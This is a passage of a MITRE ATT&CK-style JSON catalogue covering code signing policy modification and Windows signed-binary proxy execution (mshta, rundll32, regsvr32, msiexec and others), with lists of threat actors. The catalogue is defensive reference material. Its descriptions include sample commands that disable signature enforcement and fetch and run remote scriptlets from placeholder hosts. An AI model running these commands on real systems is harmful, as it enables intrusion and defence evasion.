.iso files to deploy malicious .lnk files."}]}, {"name": "Code Signing Policy Modification", "description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.", "detailed_description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include bcdedit.exe -set TESTSIGNING ON on Windows and csrutil disable on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.", "id": "T1553.006", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has enabled the TESTSIGNING boot configuration option to facilitate loading of a driver component."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver."}, {"id": "G0010", "name": "Turla", "description": "Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges."}]}]}, {"name": "System Binary Proxy Execution", "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.", "detailed_description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands.", "id": "T1218", "examples": [{"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group lnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used native tools and processes including living off the land binaries or \"LOLBins\" to maintain and expand access to the victim networks."}], "sub_techniques": [{"name": "Compiled HTML File", "description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe). ", "detailed_description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe). \nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.", "id": "T1218.001", "examples": [{"id": "G0082", "name": "APT38", "description": "APT38 has used CHM files to move concealed payloads."}, {"id": "G0096", "name": "APT41", "description": "APT41 used compiled HTML (.chm) files for targeting."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth uses ActiveX objects for file execution and manipulation. "}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim."}, {"id": "G0091", "name": "Silence", "description": "Silence has weaponized CHM files in their phishing campaigns."}]}, {"name": "Control Panel", "description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.", "detailed_description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.\nMalicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPlApplet are not directly executable.", "id": "T1218.002", "examples": [{"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can register itself for execution and persistence via the Control Panel."}, {"id": "S0172", "name": "Reaver", "description": "Reaver drops and executes a malicious CPL file as its payload."}]}, {"name": "CMSTP", "description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.", "detailed_description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to Regsvr32 / \"Squiblydoo\", CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\nCMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.", "id": "T1218.003", "examples": [{"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use CMSTP.exe to install a malicious Microsoft Connection Manager Profile."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload."}]}, {"name": "InstallUtil", "description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe.", "detailed_description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe.\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].", "id": "T1218.004", "examples": [{"id": "S0631", "name": "Chaes", "description": "Chaes has used Installutill to download content."}, {"id": "S1155", "name": "Covenant", "description": "Covenant can create launchers via an InstallUtil XML file to install new Grunt listeners."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used InstallUtil.exe to execute malicious software."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used InstallUtil.exe to execute a malicious Beacon stager."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot had used InstallUtil.exe to download and deploy executables."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate has used InstallUtil.exe as part of its process to disable Windows Defender."}]}, {"name": "Mshta", "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code     ", "detailed_description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code     \nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.", "id": "T1218.005", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has use mshta to execute malicious scripts on a compromised host."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used mshta.exe for code execution."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has used mshta.exe to download and execute applications from a remote server."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used mshta to execute DLLs."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used mshta.exe to execute malicious VBScript."}, {"id": "S1155", "name": "Covenant", "description": "Covenant can create HTA files to install Grunt listeners."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used mshta.exe to load an HTA script within a malicious .LNK file."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used mshta.exe to execute malicious files."}, {"id": "G0100", "name": "Inception", "description": "Inception has used malicious HTA files to drop and execute malware."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used mshta.exe to run malicious scripts on the system."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can use mshta to serve additional payloads and to help schedule tasks for persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used mshta.exe to execute Koadic stagers."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used mshta.exe to execute a HTA payload."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used mshta.exe to launch collection scripts."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu uses mshta.exe to load its program and files."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors executed JavaScript code via mshta.exe."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT uses mshta.exe to run malicious scripts on the system."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has been executed via MSHTA application."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has utilized mshta.exe to execute a malicious hta file."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used mshta.exe to execute malicious payloads."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used mshta to execute scripts including VBS."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used mshta.exe to execute malicious payloads."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can use mshta for executing scripts."}]}, {"name": "Msiexec", "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.", "detailed_description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the AlwaysInstallElevated policy is enabled.", "id": "T1218.007", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has been installed via MSI installer."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used .MSI files as an initial way to start the infection chain."}, {"id": "S0611", "name": "Clop", "description": "Clop can use msiexec.exe to disable security tools on the system."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE can use msiexec.exe for execution of malicious DLL."}, {"id": "S0038", "name": "Duqu", "description": "Duqu has used msiexec to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has been installed via msiexec.exe."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can use MSI files to execute DLLs."}, {"id": "S0483", "name": "IcedID", "description": "IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application.  IcedID has also used msiexec.exe to deploy the IcedID loader."}, {"id": "S0528", "name": "Javali", "description": "Javali has used the MSI installer to download and execute malicious payloads."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has called msiexec to install remotely-hosted MSI files."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner used an MSI installer to install the virtualization software."}, {"id": "G0095", "name": "Machete", "description": "Machete has used msiexec to install the Machete malware."}, {"id": "S0449", "name": "Maze", "description": "Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can use MSI files with embedded VBScript for execution."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used MsiExec.exe to automatically execute files."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu has been installed via MSI installer."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has used msiexec.exe to execute an MSI payload."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use MSIExec to spawn multiple cmd.exe processes."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has been delivered as an unsigned MSI package that was executed with msiexec.exe."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has used msiexec to download and execute malicious installer files over HTTP."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses msiexec.exe for post-installation communication to command and control infrastructure. Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has the ability to execute inside the msiexec.exe process."}, {"id": "S0592", "name": "RemoteUtilities", "description": "RemoteUtilities can use Msiexec to install a service."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used msiexec to download and execute malicious Windows Installer files."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files."}]}, {"name": "Odbcconf", "description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.", "detailed_description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}).", "id": "T1218.008", "examples": [{"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use odbcconf.exe to run DLLs on targeted hosts."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used odbcconf to proxy the execution of malicious DLL files."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses the Windows utility odbcconf.exe to execute malicious commands, using the regsvr flag to execute DLLs and bypass application control mechanisms that are not monitoring for odbcconf.exe abuse."}]}, {"name": "Regsvcs/Regasm", "description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.  ", "detailed_description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.  \nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.", "id": "T1218.009", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has dropped RegAsm.exe onto systems for performing malicious activity."}]}, {"name": "Regsvr32", "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. ", "detailed_description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.", "id": "T1218.010", "examples": [{"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can call regsvr32.exe for execution."}, {"id": "G0073", "name": "APT19", "description": "APT19 used Regsvr32 to bypass application control techniques."}, {"id": "G0050", "name": "APT32", "description": "APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can be loaded through regsvr32.exe."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors employed code that used regsvr32 for execution."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used regsvr32.exe to execute scripts."}, {"id": "S1155", "name": "Covenant", "description": "Covenant can create SCT files for installation via Regsvr32 to deploy new Grunt listeners."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can use regsvr32.exe to initiate malicious code."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used regsvr32.exe to execute malicious DLLs."}, {"id": "S0367", "name": "Emotet", "description": "Emotet uses RegSvr32 to execute the DLL payload."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can run a remote scriptlet that drops a file and executes it via regsvr32.exe."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard has used regsvr32.exe /s /i to execute malicious payloads."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism."}, {"id": "G0100", "name": "Inception", "description": "Inception has ensured persistence at system boot by setting the value regsvr32 %path%\\ctfmonrn.dll /s."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has executed malware with regsvr32s."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can use Regsvr32 to execute additional payloads."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used regsvr32 for execution."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has used regsvr32.exe to execute the malicious DLL."}, {"id": "S1047", "name": "Mori", "description": "Mori can use regsvr32.exe for DLL execution."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used regsvr32 to execute malware."}, {"id": "S0229", "name": "Orz", "description": "Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use Regsvr32 to execute malicious DLLs."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has used regsvr32.exe to execute components of VirtualBox."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses regsvr32.exe execution without any command line parameters for command and control requests to IP addresses associated with Tor nodes."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin uses regsvr32.exe to run a .sct file for execution."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used regsvr32 to execute scripts."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has been executed using regsvr32.exe."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used regsvr32.exe to load malicious DLLs."}, {"id": "S0476", "name": "Valak", "description": "Valak has used regsvr32.exe to launch malicious DLLs."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has used regsvr32.exe to trigger the execution of a malicious script."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can use regsvr32 for executing scripts."}]}, {"name": "Rundll32", "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).", "detailed_description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe.\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks.\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.", "id": "T1218.011", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. "}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence."}, {"id": "G0073", "name": "APT19", "description": "APT19 configured its payload to inject into the rundll32.exe."}, {"id": "G0007", "name": "APT28", "description": "APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe \"C:\\Windows\\twain_64.dll\". APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can run DLLs."}, {"id": "G0050", "name": "APT32", "description": "APT32 malware has used rundll32.exe to execute an initial infection process."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools."}, {"id": "G0096", "name": "APT41", "description": "APT41 has used rundll32.exe to execute a loader."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary."}, {"id": "S0438", "name": "Attor", "description": "Attor's installer plugin can schedule rundll32.exe to load the dispatcher."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea can use rundll32 for execution on compromised hosts."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"vert\" = \"rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez\"."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has used Rundll32 to load a malicious DLL."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can use RunDLL32 for execution."}, {"id": "S0204", "name": "Briba", "description": "Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has used rundll32 for execution of the loader component."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors loaded DLLs via rundll32 using the svchost process."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used rundll32 to run Mimikatz."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors used rundll32.exe to execute the Cobalt Strike Beacon loader DLL."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak installs VNC server software that executes through rundll32."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use rundll32.exe to load DLL from the command line."}, {"id": "S0244", "name": "Comnie", "description": "Comnie uses Rundll32 to load a malicious DLL."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL is installed via execution of rundll32 with an export named \"init\" or \"InitW.\""}, {"id": "S0046", "name": "CozyCar", "description": "The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly proxied execution of malicious DLLs through a renamed rundll32.exe binary."}, {"id": "S0255", "name": "DDKONG", "description": "DDKONG uses Rundll32 to ensure only a single instance of itself is running at once."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE can use rundll32.exe for execution of living off the land binaries (lolbin) such as SHELL32.DLL."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used rundll32 during execution."}, {"id": "S0081", "name": "Elise", "description": "After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe."}, {"id": "S0082", "name": "Emissary", "description": "Variants of Emissary have used rundll32.exe in Registry values added to establish persistence."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout has the ability to proxy execution of malicious files with Rundll32."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can execute commands and scripts through rundll32."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can execute via rundll32."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT uses Rundll32 for executing the dropper program."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used rundll32.exe to execute malware on a compromised network."}, {"id": "S0143", "name": "Flame", 